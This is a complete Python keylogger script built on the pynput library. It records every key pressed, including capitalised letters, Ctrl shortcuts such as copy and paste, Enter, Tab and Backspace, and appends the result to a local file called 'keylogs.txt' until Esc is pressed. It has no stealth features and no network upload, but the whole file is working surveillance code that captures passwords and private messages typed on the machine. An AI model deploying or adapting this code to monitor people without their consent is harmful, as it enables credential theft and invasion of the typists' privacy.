from pynput import keyboard

log_file = "keylogs.txt"
shift_keys = {keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r}
ctrl_keys = {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}
modifier_keys = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n',
    keyboard.Key.backspace: '<BACKSPACE>',
    keyboard.Key.tab: '<TAB>',
    keyboard.Key.ctrl_l: '<CTRL>',
    keyboard.Key.ctrl_r: '<CTRL>',
    keyboard.Key.alt_l: '<ALT>',
    keyboard.Key.alt_r: '<ALT>'
}

def on_press(key):
    with open(log_file, 'a') as f:
        if key in modifier_keys:
            f.write(modifier_keys[key])
        elif key in shift_keys or key in ctrl_keys:
            pressed_keys.add(key)  # Track pressed modifier keys
        else:
            try:
                if key.char:
                    if keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys:
                        if key.char.lower() == 'c':
                            f.write('<CTRL+C>')
                        elif key.char.lower() == 'v':
                            f.write('<CTRL+V>')
                        else:
                            f.write(f'<CTRL+{key.char.upper()}>')
                    elif any(k in pressed_keys for k in shift_keys):
                        f.write(key.char.upper())
                    else:
                        f.write(key.char)
            except AttributeError:
                pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False
    if key in shift_keys or key in ctrl_keys:
        pressed_keys.discard(key)
    elif key in modifier_keys:
        pass  # No action needed for modifier keys on release
    else:
        try:
            pressed_keys.discard(key)
        except KeyError:
            pass

pressed_keys = set()
with keyboard.Listener(
        on_press=lambda key: pressed_keys.add(key) or on_press(key),
        on_release=on_release) as listener:
    listener.join()
